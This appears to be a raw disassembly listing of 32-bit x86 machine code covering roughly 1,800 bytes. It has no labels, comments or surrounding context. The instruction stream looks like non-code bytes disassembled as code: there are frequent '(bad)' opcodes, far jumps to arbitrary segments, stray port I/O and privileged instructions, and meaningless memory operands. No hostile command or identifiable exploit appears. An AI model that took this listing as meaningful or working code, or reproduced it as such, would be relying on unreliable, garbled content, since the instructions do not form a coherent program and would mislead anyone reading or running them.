  48dbf0:	and    eax,0x833f88ac
  48dbf5:	and    eax,0x1f93c503
  48dbfa:	mov    edi,0x99885c34
  48dbff:	mov    eax,0x140f67f6
  48dc04:	inc    edx
  48dc05:	les    edi,FWORD PTR [edx]
  48dc07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48dc08:	(bad)  
  48dc09:	and    eax,0xa72004d6
  48dc0e:	xchg   edi,eax
  48dc0f:	es es pop ds
  48dc12:	pop    edx
  48dc13:	adc    al,BYTE PTR [edx+0xc]
  48dc16:	add    bl,BYTE PTR [eax+0x29]
  48dc19:	jmp    FWORD PTR [edi]
  48dc1b:	and    DWORD PTR [ecx+0x46b74bc8],ecx
  48dc21:	fistp  WORD PTR [esi]
  48dc23:	mov    al,0x26
  48dc25:	imul   eax,edi,0x27
  48dc28:	push   0x73b69745
  48dc2d:	arpl   WORD PTR [ecx-0x4cb53bb8],sp
  48dc33:	mov    bh,0x49
  48dc35:	xchg   DWORD PTR [ebp+0x50],esi
  48dc38:	aas    
  48dc39:	or     esi,DWORD PTR [ecx]
  48dc3b:	mov    DWORD PTR [ebp+0x42978601],eax
  48dc41:	dec    ebx
  48dc42:	stos   DWORD PTR es:[edi],eax
  48dc43:	dec    edx
  48dc44:	mov    edx,0x30f38f6d
  48dc49:	jg     0x48dcab
  48dc4b:	jne    0x48dc4e
  48dc4d:	jp     0x48dcbe
  48dc4f:	out    dx,eax
  48dc50:	or     DWORD PTR [esi+eiz*1+0x26c73f5c],ecx
  48dc57:	cmp    BYTE PTR [esi-0x6b],dl
  48dc5a:	daa    
  48dc5b:	(bad)  
  48dc5c:	xor    eax,0x80dc4818
  48dc61:	(bad)  
  48dc62:	jne    0x48dca0
  48dc64:	mov    WORD PTR [edx],gs
  48dc66:	out    dx,eax
  48dc67:	iret   
  48dc68:	pop    ds
  48dc69:	xor    DWORD PTR [edx+0x35bf604c],ebp
  48dc6f:	pop    edx
  48dc70:	and    eax,DWORD PTR [eax]
  48dc72:	das    
  48dc73:	out    dx,eax
  48dc74:	arpl   WORD PTR [eax],di
  48dc76:	or     ah,BYTE PTR [ebp+0x2c1f308f]
  48dc7c:	and    dh,BYTE PTR [eax-0x4930be70]
  48dc82:	push   esi
  48dc83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48dc84:	add    DWORD PTR [edi-0x329fbb58],esp
  48dc8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48dc8b:	iret   
  48dc8c:	or     DWORD PTR [eax+esi*4],ebp
  48dc8f:	mov    dh,0x87
  48dc91:	loop   0x48dcab
  48dc93:	mov    eax,ds:0x5f279542
  48dc98:	sub    al,BYTE PTR [esi]
  48dc9a:	push   es
  48dc9b:	or     eax,0xc04ae7cf
  48dca0:	in     eax,dx
  48dca1:	rol    bh,0x3e
  48dca4:	and    ecx,DWORD PTR [esi]
  48dca6:	sub    DWORD PTR [ecx],edx
  48dca8:	mov    bh,0xcf
  48dcaa:	mov    ds:0x870945d5,al
  48dcaf:	and    edx,0x2d
  48dcb2:	adc    BYTE PTR [eax+0x3a0583ef],dl
  48dcb8:	lock mov al,0xe7
  48dcbb:	out    dx,eax
  48dcbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48dcbd:	rcr    BYTE PTR [edx],0x35
  48dcc0:	adc    bl,bh
  48dcc2:	cmp    BYTE PTR [edi],bh
  48dcc4:	pop    ss
  48dcc5:	dec    edx
  48dcc6:	pop    ecx
  48dcc7:	jmp    0x54a3:0x33a733c7
  48dcce:	add    al,0x13
  48dcd0:	pop    ss
  48dcd1:	mov    bh,0x70
  48dcd3:	xor    ebp,DWORD PTR [esi]
  48dcd5:	add    BYTE PTR [ebx],bh
  48dcd7:	iret   
  48dcd8:	xor    ebx,DWORD PTR [ebx]
  48dcda:	jp     0x48dd0e
  48dcdc:	(bad)  
  48dcdd:	iret   
  48dcde:	xchg   DWORD PTR [edi+0x4f8d49c1],esp
  48dce4:	aaa    
  48dce5:	xchg   edi,eax
  48dce6:	je     0x48dc91
  48dce8:	mov    ds:0x18566388,al
  48dced:	les    eax,FWORD PTR [eax+0xa]
  48dcf0:	(bad)  
  48dcf1:	dec    edi
  48dcf2:	mov    al,0x4e
  48dcf4:	sbb    eax,DWORD PTR [edi]
  48dcf6:	jecxz  0x48dcb7
  48dcf8:	mov    eax,ds:0xd7d06b0f
  48dcfd:	aas    
  48dcfe:	shl    DWORD PTR [edi],0x46
  48dd01:	xor    eax,0x35df2317
  48dd06:	pop    ecx
  48dd07:	pop    edx
  48dd08:	pop    ebx
  48dd09:	out    dx,eax
  48dd0a:	jmp    0x48dcf5
  48dd0c:	or     BYTE PTR ds:0x7fdf33d6,bl
  48dd12:	add    ah,BYTE PTR [ebx-0x10d0b29e]
  48dd18:	test   DWORD PTR [edx+0x2f0f4145],eax
  48dd1e:	dec    edx
  48dd1f:	add    al,0xb9
  48dd21:	push   cs
  48dd22:	xlat   BYTE PTR ds:[ebx]
  48dd23:	xor    edx,DWORD PTR [edi]
  48dd25:	adc    al,0xd2
  48dd27:	fwait
  48dd28:	mov    eax,0x5c36af33
  48dd2d:	int    0xda
  48dd2f:	test   bh,ah
  48dd31:	daa    
  48dd32:	ror    DWORD PTR ss:[esi],cl
  48dd35:	pop    ebp
  48dd36:	push   esp
  48dd37:	lahf   
  48dd38:	aaa    
  48dd39:	imul   esi,DWORD PTR [edi],0x2e
  48dd3c:	and    eax,0x35ff6b37
  48dd41:	retf   0x2687
  48dd44:	adc    dh,BYTE PTR [ebx-0x4b9f4841]
  48dd4a:	xchg   ecx,eax
  48dd4b:	xchg   edx,eax
  48dd4c:	xor    BYTE PTR [edi],ah
  48dd4e:	dec    eax
  48dd4f:	adc    DWORD PTR [ecx+0x14a13fc0],0xffffff92
  48dd56:	out    0x5e,al
  48dd58:	inc    ebx
  48dd59:	inc    edx
  48dd5a:	es ret 0x8d0a
  48dd5e:	leave  
  48dd5f:	xor    esp,DWORD PTR [edi]
  48dd61:	mov    ch,BYTE PTR [esi+0x14]
  48dd64:	sub    eax,0xcf2287cf
  48dd69:	mov    eax,0x473022a0
  48dd6e:	cmp    DWORD PTR [ecx-0x20e3b7ae],esi
  48dd74:	xchg   ebx,eax
  48dd75:	ins    BYTE PTR es:[edi],dx
  48dd76:	ret    0x115b
  48dd79:	daa    
  48dd7a:	fbstp  TBYTE PTR [edi-0x26]
  48dd7d:	sbb    BYTE PTR es:[edi+edi*8],ah
  48dd81:	aaa    
  48dd82:	pop    ebx
  48dd83:	(bad)  [ecx-0x73]
  48dd86:	sbb    bh,0xf
  48dd89:	shr    DWORD PTR [edx],cl
  48dd8b:	inc    ecx
  48dd8c:	sub    edx,esi
  48dd8e:	pop    ds
  48dd8f:	mov    bh,0x2
  48dd91:	pop    edx
  48dd92:	or     eax,0xe83efc4
  48dd97:	and    dh,BYTE PTR [ecx]
  48dd99:	mov    bh,0x7
  48dd9b:	and    ch,cl
  48dd9d:	mov    ds:0xf1cf764e,al
  48dda2:	mov    ah,0x8a
  48dda4:	sub    al,0x8f
  48dda6:	imul   esi,DWORD PTR [ebx+0x77966c00],0xffffff87
  48ddad:	cmp    BYTE PTR [edx-0x4f],bl
  48ddb0:	push   edx
  48ddb1:	daa    
  48ddb2:	xchg   edi,eax
  48ddb3:	add    BYTE PTR [eax],ah
  48ddb5:	je     0x48dd77
  48ddb7:	cmovge ecx,DWORD PTR [esi+0xe6718b5]
  48ddbe:	ss in  al,0x4a
  48ddc1:	add    cl,BYTE PTR [ebx-0x59cc50c9]
  48ddc7:	(bad)  
  48ddc8:	add    eax,0x75139fa4
  48ddcd:	mov    al,0xe2
  48ddcf:	lahf   
  48ddd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ddd1:	outs   dx,DWORD PTR ds:[esi]
  48ddd2:	push   es
  48ddd3:	adc    ah,bh
  48ddd5:	push   edx
  48ddd6:	das    
  48ddd7:	scas   al,BYTE PTR es:[edi]
  48ddd8:	inc    edi
  48ddd9:	bound  esp,QWORD PTR [eax+eax*4-0x5b28bedf]
  48dde0:	mov    ecx,0x447f5489
  48dde5:	cmp    al,ah
  48dde7:	or     cl,BYTE PTR [ecx]
  48dde9:	test   BYTE PTR [edi+0x41],dl
  48ddec:	call   0x745:0x4fa3a1b8
  48ddf3:	xor    al,0x74
  48ddf5:	ins    BYTE PTR es:[edi],dx
  48ddf6:	dec    ebp
  48ddf7:	lds    esi,FWORD PTR [edi+0x630edb39]
  48ddfd:	test   al,0x6
  48ddff:	aaa    
  48de00:	aaa    
  48de01:	das    
  48de02:	arpl   bp,ax
  48de04:	rol    ch,1
  48de06:	dec    DWORD PTR [edi-0x494ec540]
  48de0c:	jg     0x48de3d
  48de0e:	lahf   
  48de0f:	adc    ebp,DWORD PTR [ecx+0xfcf3a98]
  48de15:	arpl   bx,bx
  48de17:	xor    al,0x2
  48de19:	aas    
  48de1a:	inc    edi
  48de1b:	jg     0x48ddca
  48de1d:	pop    eax
  48de1e:	fimul  DWORD PTR [eax+0x1b]
  48de21:	aas    
  48de22:	sub    BYTE PTR [edx],al
  48de24:	je     0x48ddd6
  48de26:	call   FWORD PTR [bx]
  48de29:	test   eax,0x1fd15a40
  48de2e:	scas   eax,DWORD PTR es:[edi]
  48de2f:	sub    eax,esp
  48de31:	push   0x17
  48de33:	call   DWORD PTR [bx+0x5b60]
  48de38:	and    al,0x12
  48de3a:	push   edi
  48de3b:	daa    
  48de3c:	mov    esi,0x37ee3a30
  48de41:	push   ss
  48de42:	out    dx,eax
  48de43:	inc    edi
  48de44:	shr    BYTE PTR [ebx+eax*1+0x1b],1
  48de48:	out    0x7b,eax
  48de4a:	pop    edx
  48de4b:	xchg   DWORD PTR [esi-0x2f],eax
  48de4e:	inc    edx
  48de4f:	aas    
  48de50:	ffreep st(0)
  48de52:	bound  ecx,QWORD PTR [eax+ecx*1-0x37e08831]
  48de59:	xor    BYTE PTR [edx-0x39],ah
  48de5c:	pop    ss
  48de5d:	aaa    
  48de5e:	xchg   edx,eax
  48de5f:	dec    esi
  48de60:	bound  edx,QWORD PTR ds:0xae44ee2f
  48de66:	or     eax,0x7f93150b
  48de6b:	aas    
  48de6c:	lods   al,BYTE PTR ds:[esi]
  48de6d:	or     BYTE PTR [eax-0x3d],0x27
  48de71:	aaa    
  48de72:	ins    BYTE PTR es:[edi],dx
  48de73:	sub    eax,0xc4ff488a
  48de78:	and    eax,0x34475709
  48de7d:	aaa    
  48de7e:	inc    ebx
  48de7f:	add    al,0x3a
  48de81:	xor    BYTE PTR [ecx-0x9],al
  48de84:	arpl   WORD PTR ds:[ecx+0xd],ax
  48de88:	adc    esp,DWORD PTR [edi-0x18]
  48de8b:	(bad)  
  48de8c:	adc    DWORD PTR [esi+0xf],esi
  48de8f:	aas    
  48de90:	pop    es
  48de91:	jb     0x48de1e
  48de93:	leave  
  48de94:	ror    BYTE PTR [edi+0x57],1
  48de97:	fs pusha 
  48de99:	vmaxpd ymm7,ymm7,YMMWORD PTR [eax]
  48de9d:	inc    edi
  48de9e:	es inc ebx
  48dea0:	rcr    DWORD PTR [edx],cl
  48dea2:	aaa    
  48dea3:	mov    edi,0x6b35ac36
  48dea8:	xor    DWORD PTR [edi-0x29eba319],0xff727c6
  48deb2:	imul   ebp,esp,0x37334b80
  48deb8:	add    dh,dl
  48deba:	scas   al,BYTE PTR es:[edi]
  48debb:	(bad)  
  48debc:	das    
  48debd:	pop    edi
  48debe:	xlat   BYTE PTR ds:[ebx]
  48debf:	mov    al,ds:0xf7d57532
  48dec4:	xor    edx,edi
  48dec6:	popa   
  48dec7:	jne    0x48dee4
  48dec9:	sbb    BYTE PTR [ecx],bh
  48decb:	xchg   DWORD PTR [edx+0xfae0052],eax
  48ded1:	xor    ch,BYTE PTR [edi-0x70]
  48ded4:	imul   eax,DWORD PTR [edx],0x10
  48ded7:	(bad)  
  48ded8:	cmp    DWORD PTR [ebx+eax*1+0x5f5f95d6],edx
  48dedf:	and    BYTE PTR [ebp+0x30a76e42],dl
  48dee5:	push   ebx
  48dee6:	(bad)  
  48dee7:	xlat   BYTE PTR ds:[ebx]
  48dee8:	sub    bh,BYTE PTR [edi-0x752a8da9]
  48deee:	mov    al,0x13
  48def0:	iret   
  48def1:	out    0x34,eax
  48def3:	ins    DWORD PTR es:[edi],dx
  48def4:	mov    esp,DWORD PTR [ebx]
  48def6:	popa   
  48def7:	retf   
  48def8:	ret    0xda53
  48defb:	and    BYTE PTR [ebx-0x53],0x87
  48deff:	sti    
  48df00:	rol    DWORD PTR [edi-0x3b727fff],cl
  48df06:	fisttp WORD PTR [edi-0x5b]
  48df09:	push   0xe78f488d
  48df0e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  48df10:	and    esi,DWORD PTR [ecx-0x51]
  48df13:	pop    ss
  48df14:	imul   esi,DWORD PTR [ebp+0x13],0xfffffff1
  48df18:	mov    bh,bh
  48df1a:	out    dx,eax
  48df1b:	inc    edx
  48df1c:	adc    al,0x82
  48df1e:	push   edx
  48df1f:	adc    esp,DWORD PTR [edi-0x41]
  48df22:	iret   
  48df23:	push   edx
  48df24:	call   0x8021:0x5bcf1706
  48df2b:	add    al,0xcf
  48df2d:	pop    edi
  48df2e:	out    0x85,eax
  48df30:	dec    edi
  48df31:	imul   edx,esp,0x57
  48df34:	or     eax,DWORD PTR [ebx+0x4d]
  48df37:	(bad)  
  48df38:	dec    ebx
  48df39:	xchg   ecx,eax
  48df3a:	addr16 aas 
  48df3c:	pop    ebx
  48df3d:	mov    ds:0x6f8ec49d,eax
  48df42:	out    0x9f,eax
  48df44:	sar    BYTE PTR [esi+eax*8-0x52],cl
  48df48:	scas   eax,DWORD PTR es:[edi]
  48df49:	mov    edi,0x30623744
  48df4e:	or     cl,BYTE PTR [eax+0x7]
  48df51:	and    al,0x42
  48df53:	lds    eax,FWORD PTR [edx-0x21]
  48df56:	pop    ss
  48df57:	jne    0x48df05
  48df59:	jne    0x48df88
  48df5b:	test   DWORD PTR [edi],0x86104bdf
  48df61:	or     dh,BYTE PTR [edi]
  48df63:	inc    ebx
  48df64:	jo     0x48df9a
  48df66:	pop    esp
  48df67:	mov    bl,bh
  48df69:	stos   BYTE PTR es:[edi],al
  48df6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48df6b:	inc    ecx
  48df6c:	jne    0x48df99
  48df6e:	sbb    eax,0x5b372f04
  48df73:	mov    eax,ds:0x5731d090
  48df78:	dec    ebp
  48df79:	ror    BYTE PTR [ebp+0x278a072e],0x5d
  48df80:	mov    dl,ch
  48df82:	dec    edx
  48df83:	fist   WORD PTR [ebx-0x5a]
  48df86:	lods   eax,DWORD PTR ds:[esi]
  48df87:	mov    al,0xd0
  48df89:	inc    ebp
  48df8a:	jg     0x48dfb3
  48df8c:	pusha  
  48df8d:	fstp   st(2)
  48df8f:	push   esi
  48df90:	lahf   
  48df91:	lahf   
  48df92:	aaa    
  48df93:	scas   al,BYTE PTR es:[edi]
  48df94:	push   esi
  48df95:	adc    DWORD PTR [esi+0x77],edx
  48df98:	ja     0x48dfac
  48df9a:	xor    bl,BYTE PTR [edx+0xc]
  48df9d:	ins    DWORD PTR es:[edi],dx
  48df9e:	pop    edx
  48df9f:	aaa    
  48dfa0:	aas    
  48dfa1:	and    BYTE PTR [edx+ebp*1],cl
  48dfa4:	sub    eax,0x22faef2b
  48dfa9:	push   esi
  48dfaa:	xchg   ebp,eax
  48dfab:	xlat   BYTE PTR ds:[ebx]
  48dfac:	adc    ebx,DWORD PTR ds:0xdf1c6e32
  48dfb2:	jbe    0x48df3b
  48dfb4:	xor    DWORD PTR ds:0x496f5809,0xa7946840
  48dfbe:	mov    ecx,0x7705849
  48dfc3:	xchg   DWORD PTR [ecx+0x6d],eax
  48dfc6:	add    eax,0x3fa72400
  48dfcb:	in     al,0x5b
  48dfcd:	popa   
  48dfce:	pusha  
  48dfcf:	pop    ds
  48dfd0:	(bad)  
  48dfd1:	xor    al,0x81
  48dfd3:	adc    DWORD PTR [esp+ebp*4],0x7
  48dfd7:	stos   DWORD PTR es:[edi],eax
  48dfd8:	sbb    dl,BYTE PTR [eax]
  48dfda:	push   edx
  48dfdb:	and    eax,0xe9285237
  48dfe0:	sbb    bh,0x41
  48dfe3:	xchg   edi,eax
  48dfe4:	(bad)  
  48dfe5:	loope  0x48e047
  48dfe7:	add    bh,bh
  48dfe9:	inc    esp
  48dfea:	push   edi
  48dfeb:	push   esi
  48dfec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48dfed:	inc    ecx
  48dfee:	dec    eax
  48dfef:	pop    edi
  48dff0:	setp   BYTE PTR [ecx+eiz*2+0x1]
  48dff5:	pop    ds
  48dff6:	fbld   TBYTE PTR [ecx+0x27b53a10]
  48dffc:	dec    ebx
  48dffd:	jne    0x48dfa7
  48dfff:	shl    DWORD PTR [ecx+0x42],0x37
  48e003:	aaa    
  48e004:	inc    ebx
  48e005:	in     al,0x62
  48e007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e008:	aaa    
  48e009:	inc    ebx
  48e00a:	sti    
  48e00b:	ret    
  48e00c:	scas   al,BYTE PTR es:[edi]
  48e00d:	dec    ebx
  48e00e:	sub    ah,BYTE PTR [edi-0x61]
  48e011:	iret   
  48e012:	jecxz  0x48e02f
  48e014:	mov    eax,0xa06fdb58
  48e019:	push   ecx
  48e01a:	adc    DWORD PTR [ebx-0x296ba0e1],ecx
  48e020:	inc    esi
  48e021:	xchg   ebx,eax
  48e022:	xlat   BYTE PTR ds:[ebx]
  48e023:	imul   edx
  48e025:	push   ss
  48e026:	jb     0x48e063
  48e028:	daa    
  48e029:	div    DWORD PTR [eax]
  48e02b:	push   ds
  48e02c:	add    BYTE PTR [ecx],cl
  48e02e:	sub    bl,BYTE PTR [ebp+0x5f]
  48e031:	outs   dx,DWORD PTR ds:[esi]
  48e032:	stos   DWORD PTR es:[edi],eax
  48e033:	and    al,0x80
  48e035:	xor    eax,0x68bf757
  48e03a:	mov    al,0x5
  48e03c:	pop    es
  48e03d:	addr16 lahf 
  48e03f:	sbb    al,0x31
  48e041:	pop    esp
  48e042:	ins    BYTE PTR es:[edi],dx
  48e043:	add    edi,DWORD PTR [edi+0x16a03117]
  48e049:	push   esi
  48e04a:	adc    BYTE PTR [edi],bl
  48e04c:	daa    
  48e04d:	push   ss
  48e04e:	test   DWORD PTR [edx-0x1d],eax
  48e051:	inc    esi
  48e052:	scas   eax,DWORD PTR es:[edi]
  48e053:	jg     0x48e09f
  48e055:	stos   DWORD PTR es:[edi],eax
  48e056:	or     al,BYTE PTR [eax]
  48e058:	inc    edi
  48e059:	push   esp
  48e05a:	and    DWORD PTR [edx],ecx
  48e05c:	stos   DWORD PTR es:[edi],eax
  48e05d:	mov    edi,0x55a0a1af
  48e062:	and    DWORD PTR [edi+0xd62769f],edx
  48e068:	shl    BYTE PTR [edi+0x1b926a0f],cl
  48e06e:	xchg   ebx,eax
  48e06f:	xlat   BYTE PTR ds:[ebx]
  48e070:	pop    ds
  48e071:	xlat   BYTE PTR ds:[ebx]
  48e072:	or     esi,DWORD PTR [eax-0x703c29bf]
  48e078:	gs or  al,0x51
  48e07b:	add    BYTE PTR [edi-0x74fc12cc],al
  48e081:	icebp  
  48e082:	xor    DWORD PTR [edi+0x69ad5787],0xffffff9d
  48e089:	pop    edx
  48e08a:	pop    ss
  48e08b:	pop    edi
  48e08c:	mov    ds:0xe7a30831,al
  48e091:	iret   
  48e092:	outs   dx,DWORD PTR ds:[esi]
  48e093:	and    edi,DWORD PTR [eax+0x1e8f5695]
  48e099:	pop    es
  48e09a:	inc    esi
  48e09b:	test   eax,0x476f6ac0
  48e0a0:	adc    eax,DWORD PTR [esi]
  48e0a2:	mov    al,0x59
  48e0a4:	js     0x48e115
  48e0a6:	sub    ebx,DWORD PTR [ebx-0x7897acf4]
  48e0ac:	ja     0x48e0f1
  48e0ae:	lahf   
  48e0af:	mov    al,0x41
  48e0b1:	mov    edx,DWORD PTR [eax]
  48e0b3:	rcr    BYTE PTR [ebx+0x5068c0aa],cl
  48e0b9:	pop    edi
  48e0ba:	ja     0x48e06b
  48e0bc:	and    BYTE PTR [ecx+0x4a],dl
  48e0bf:	rcr    BYTE PTR [edi+0x60],0xb7
  48e0c3:	mov    dh,0x4b
  48e0c5:	fistp  QWORD PTR [edi-0x227c7d29]
  48e0cb:	test   al,0x2f
  48e0cd:	and    ah,BYTE PTR [edi+0x43]
  48e0d0:	xchg   edi,eax
  48e0d1:	dec    ecx
  48e0d2:	imul   eax,DWORD PTR [esi],0xffffffab
  48e0d5:	mul    DWORD PTR [edi-0x76]
  48e0d8:	mov    WORD PTR [ecx],cs
  48e0da:	data16 mov bh,0x32
  48e0dd:	(bad)  
  48e0de:	outs   dx,BYTE PTR ds:[esi]
  48e0df:	adc    ebp,DWORD PTR [ebx-0x2a]
  48e0e2:	pop    edi
  48e0e3:	aaa    
  48e0e4:	or     ch,BYTE PTR [ebx+0x18fd0ca]
  48e0ea:	inc    esi
  48e0eb:	es and ch,bh
  48e0ee:	xor    BYTE PTR [edi],dh
  48e0f0:	aaa    
  48e0f1:	or     eax,0xdf061ed7
  48e0f6:	lahf   
  48e0f7:	inc    esp
  48e0f8:	cmovo  ebp,DWORD PTR [esi]
  48e0fb:	bound  esp,QWORD PTR [eax+0x7f]
  48e0fe:	inc    ebx
  48e0ff:	fisubr DWORD PTR [ecx]
  48e101:	add    eax,0xddd33664
  48e106:	xor    BYTE PTR [eax-0x5990003d],0x18
  48e10d:	stos   DWORD PTR es:[edi],eax
  48e10e:	push   0xab30f6f7
  48e113:	xor    al,0x84
  48e115:	nop
  48e116:	inc    ebp
  48e117:	movntq QWORD PTR [edx-0x785d5c89],mm7
  48e11e:	add    dl,BYTE PTR [edi-0x36]
  48e121:	adc    BYTE PTR [ebp+esi*4-0x60],0x87
  48e126:	das    
  48e127:	scas   eax,DWORD PTR es:[edi]
  48e128:	stos   BYTE PTR es:[edi],al
  48e129:	je     0x48e140
  48e12b:	adc    al,0x47
  48e12d:	inc    esp
  48e12e:	push   edi
  48e12f:	pop    edx
  48e130:	add    eax,0xdf4fc069
  48e135:	pop    eax
  48e136:	xlat   BYTE PTR ds:[ebx]
  48e137:	and    BYTE PTR [ebp+0x486f8e27],cl
  48e13d:	stos   DWORD PTR es:[edi],eax
  48e13e:	adc    eax,0x3687e712
  48e143:	push   ecx
  48e144:	sub    eax,0xbe305726
  48e149:	xchg   DWORD PTR [edx+eax*1],ebp
  48e14c:	push   edx
  48e14d:	sbb    BYTE PTR [edi],bh
  48e14f:	icebp  
  48e150:	mov    dh,0x45
  48e152:	add    bh,al
  48e154:	dec    edi
  48e155:	scas   eax,DWORD PTR es:[edi]
  48e156:	sub    BYTE PTR [ecx-0x13],cl
  48e159:	xchg   edx,eax
  48e15a:	(bad)  
  48e15b:	pop    ss
  48e15c:	cs and esp,eax
  48e15f:	mov    al,0xc7
  48e161:	jg     0x48e10e
  48e163:	pop    edx
  48e164:	mov    ebx,esi
  48e166:	arpl   di,cx
  48e168:	scas   eax,DWORD PTR es:[edi]
  48e169:	inc    edx
  48e16a:	add    bh,BYTE PTR [ecx+0x5c43d742]
  48e170:	test   DWORD PTR [eax],eax
  48e172:	mov    cs,edx
  48e174:	pop    ss
  48e175:	inc    esp
  48e176:	imul   esp,DWORD PTR ds:0xbff0838,0x4
  48e17d:	or     al,BYTE PTR [eax+0x52274f8b]
  48e183:	mov    edx,0x3f270156
  48e188:	mov    ah,0x49
  48e18a:	outs   dx,DWORD PTR ds:[esi]
  48e18b:	inc    ebp
  48e18c:	das    
  48e18d:	pop    edi
  48e18e:	(bad)  
  48e18f:	cs ss inc edx
  48e192:	add    eax,0x5633d7f7
  48e197:	lds    edx,FWORD PTR [esi+0x42]
  48e19a:	(bad)  
  48e19c:	mov    ds:0x2d0f00ca,eax
  48e1a1:	cwde   
  48e1a2:	add    BYTE PTR [edi+esi*2+0x76148217],cl
  48e1a9:	lods   al,BYTE PTR ds:[esi]
  48e1aa:	fild   QWORD PTR [ebx-0x52eeb7af]
  48e1b0:	pop    edi
  48e1b1:	outs   dx,DWORD PTR ds:[esi]
  48e1b2:	mov    al,0x9a
  48e1b4:	sub    ecx,esp
  48e1b6:	(bad)  
  48e1b7:	inc    DWORD PTR [ecx+0x0]
  48e1ba:	cmp    DWORD PTR [esi+eax*8+0x8345f31],esi
  48e1c1:	mov    dl,BYTE PTR [ebp+0x5f]
  48e1c4:	mov    al,0x62
  48e1c6:	pusha  
  48e1c7:	mov    ch,0xcf
  48e1c9:	lahf   
  48e1ca:	xor    BYTE PTR [edx+0x5f5f5562],ah
  48e1d0:	pop    eax
  48e1d1:	shl    DWORD PTR [eax+0x75fc2e2],0xac
  48e1d8:	stos   BYTE PTR es:[edi],al
  48e1d9:	mov    cl,0x13
  48e1db:	push   edi
  48e1dc:	lahf   
  48e1dd:	inc    esp
  48e1de:	icebp  
  48e1df:	sbb    BYTE PTR [ecx+0x5f],dl
  48e1e2:	jmp    0x9718:0x13aeb85f
  48e1e9:	cmp    DWORD PTR [edi],ebx
  48e1eb:	add    al,0xa4
  48e1ed:	cwde   
  48e1ee:	mov    eax,0x846cef32
  48e1f3:	pop    eax
  48e1f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e1f5:	add    ecx,DWORD PTR [bx]
  48e1f8:	mov    DWORD PTR [eax],ebx
  48e1fa:	cmp    al,dl
  48e1fc:	cmp    DWORD PTR [edi+0x4a1714ff],esi
  48e202:	xchg   ecx,eax
  48e203:	xor    bh,BYTE PTR [edi]
  48e205:	ss daa 
  48e207:	adc    al,0x2b
  48e209:	mov    al,0x46
  48e20b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e20c:	call   DWORD PTR [ebx]
  48e20e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e20f:	and    DWORD PTR [ebx],eax
  48e211:	inc    ebp
  48e212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e213:	(bad)  
  48e214:	(bad)
  48e219:	das    
  48e21a:	lea    edx,[edx]
  48e21c:	sbb    BYTE PTR [edi+esi*1],dl
  48e21f:	out    0x2b,eax
  48e221:	scas   al,BYTE PTR es:[edi]
  48e222:	mov    DWORD PTR ds:0xdef0747,esi
  48e228:	lods   al,BYTE PTR ds:[esi]
  48e229:	sar    DWORD PTR [edx+0x77],cl
  48e22c:	call   DWORD PTR [ecx]
  48e22e:	dec    esp
  48e22f:	sub    al,0xc1
  48e231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e232:	iret   
  48e233:	cmp    BYTE PTR [edi],bl
  48e235:	cmp    BYTE PTR [eax-0x58b09580],dl
  48e23b:	inc    eax
  48e23c:	sbb    dh,BYTE PTR [eax+0x104f1fda]
  48e242:	inc    edx
  48e243:	mov    es,WORD PTR [ecx]
  48e245:	xlat   BYTE PTR ds:[ebx]
  48e246:	xor    ebp,eax
  48e248:	mov    BYTE PTR [esp+eax*2-0x5d207881],ah
  48e24f:	or     al,0xd2
  48e251:	adc    BYTE PTR [ebx-0x51],al
  48e254:	fist   WORD PTR [esi+0x17]
  48e257:	add    eax,0xa35c7ac
  48e25c:	and    ecx,DWORD PTR [edx+0x4030b71f]
  48e262:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  48e264:	pop    ss
  48e265:	xor    al,0x8d
  48e267:	shr    al,cl
  48e269:	add    bh,dl
  48e26b:	not    ecx
  48e26d:	and    cl,BYTE PTR [ebx+0x18]
  48e270:	ja     0x48e291
  48e272:	add    ecx,esp
  48e274:	or     eax,0x10533715
  48e279:	or     BYTE PTR [edx+0x1a1f1f41],ah
  48e27f:	xor    DWORD PTR [edx-0x70e0d598],eax
  48e285:	nop
  48e286:	cmp    al,0x54
  48e288:	rcr    DWORD PTR [edi],1
  48e28a:	cmp    BYTE PTR [eax],al
  48e28c:	xor    eax,0x189826b4
  48e291:	pop    ds
  48e292:	test   al,0xe8
  48e294:	add    al,BYTE PTR [edi+ebx*1+0x56]
  48e298:	pop    ds
  48e299:	inc    esp
  48e29a:	stos   DWORD PTR es:[edi],eax
  48e29b:	push   ebx
  48e29c:	mov    bh,0x37
  48e29f:	push   0xd7b6145d
  48e2a4:	aaa    
  48e2a5:	mov    al,0x2
  48e2a7:	mov    ecx,0xb431f82
  48e2ac:	or     eax,0x62572add
  48e2b1:	inc    edi
  48e2b2:	push   ss
  48e2b3:	inc    edx
  48e2b4:	jo     0x48e2c0
  48e2b6:	xchg   edx,esp
  48e2b8:	adc    BYTE PTR [ecx+0x6f34876b],al
  48e2be:	adc    BYTE PTR [eax-0x6b],dh
  48e2c1:	adc    DWORD PTR [ebx+0x45],ecx
  48e2c4:	popa   
  48e2c5:	dec    ebp
  48e2c6:	pop    eax
  48e2c7:	popf   
  48e2c8:	ja     0x48e339
  48e2ca:	mov    ch,0x62
  48e2cc:	push   0x582fe775
  48e2d1:	adc    eax,0x176f0b0b
  48e2d6:	mov    cl,0xe1
  48e2d8:	lods   eax,DWORD PTR ds:[esi]
  48e2d9:	pop    ebx
  48e2da:	mov    edi,0x3c015373
  48e2df:	test   BYTE PTR [edx],ch
  48e2e1:	xchg   edi,eax
  48e2e2:	lods   al,BYTE PTR ds:[si]
  48e2e4:	test   BYTE PTR [eax+0x59cf77ba],dl
  48e2ea:	ret    0x26d5
  48e2ed:	xchg   DWORD PTR [edi],ebx
  48e2ef:	inc    ecx
  48e2f0:	cmp    esi,DWORD PTR [ecx+0x5f271fb6]
